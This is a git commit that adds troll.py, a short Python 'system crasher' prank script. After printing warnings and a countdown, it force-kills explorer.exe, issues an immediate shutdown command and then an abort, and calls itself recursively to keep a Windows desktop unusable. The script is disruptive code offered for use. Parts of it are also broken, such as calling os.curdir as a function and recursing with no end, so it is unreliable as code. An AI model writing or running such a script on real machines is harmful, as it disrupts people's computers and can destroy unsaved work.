3a0958b78ab5b693c0364a85c350aba0f159d0d6
yigit11311 <saganetpoop@gmail.com>
2025-12-27 18:47:38 +0300

    main file

---
+++ troll.py
@@ -0,0 +1,16 @@
+import os
+import time
+print("System crasher, will fixed if restarted/shutdowned.U will dont be able to use until u close physically.")
+print("NOTE AGAIN, IF U WANNA USE AGAIN THE PC, PSYCHICALLY SHUTDOWN PC")
+bekleme_seyi = 0
+def program():
+    os.listvolumes()
+    os.listdrives()
+    os.system("Taskkill /F /IM explorer.exe")
+    os.system("shutdown  /t 0")
+    os.system("shutdown /a")
+    os.curdir()
+    program()
+print("If u dont close, will start in 5 seconds.")
+time.sleep(5)
+program()
